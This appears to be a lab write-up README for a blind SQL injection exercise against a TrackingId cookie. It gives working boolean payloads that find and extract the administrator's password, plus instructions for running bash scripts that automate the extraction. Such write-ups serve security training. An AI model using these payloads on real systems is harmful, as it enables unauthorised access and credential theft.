
### First we intercept the request using Burp and then test the TrackingId cookie parameter for injection vulnerability. If we get a "Welcome back!" in the response, then its vulnerable.
```

'+AND+'1'='1

```

#### Result
![image](https://user-images.githubusercontent.com/86168235/125645177-b1c3135a-84ef-40ac-b7bf-8ee76b8a8593.png)

## Password Length Determination

### Manual method

#### Note, I've added a script to automate the password length count. If you want to do it manually then use following query
```

'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a;
'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>2)%3d'a;
'+AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>3)%3d'a;
and so on...

```
### Automated method
#### Just make the `pass_len_count.sh` script executable with `chmod +x pass_len_count.sh` and then run the command as follows
```

./pass_len_count.sh "vulnerable_target_url" "TrackingId cookie"

```
#### Example

![image](https://user-images.githubusercontent.com/86168235/125658846-8c6df64c-6bec-444f-af51-0df8f97f9d4a.png)


## Password Determination

If you've made this far, then you're pretty experienced now. So, I won't be explaining anything and just showing how to execute the scripts I've written.
There are two bash scripts`blind_sqli_wget.sh` and `blind_sqli_curl.sh` which will give you the password(I wanted to create a python one too but due to lack of time I couldn't 😔). 

### Wget2
![image](https://user-images.githubusercontent.com/86168235/125660753-9c034a97-f950-4350-8ba0-cf54f8db2221.png)

**Note**:- I've used wget2 instead of wget(yes there is **wget2**, *the more you know*) as I've tested and found it to be 10-15% faster than both **curl** and **wget**. If you don't want to install another tool, then you can edit the script and change **wget2** to wget.


### Curl
![image](https://user-images.githubusercontent.com/86168235/125661498-0f37d453-9326-42d6-8b3d-40fb0271ec5a.png)


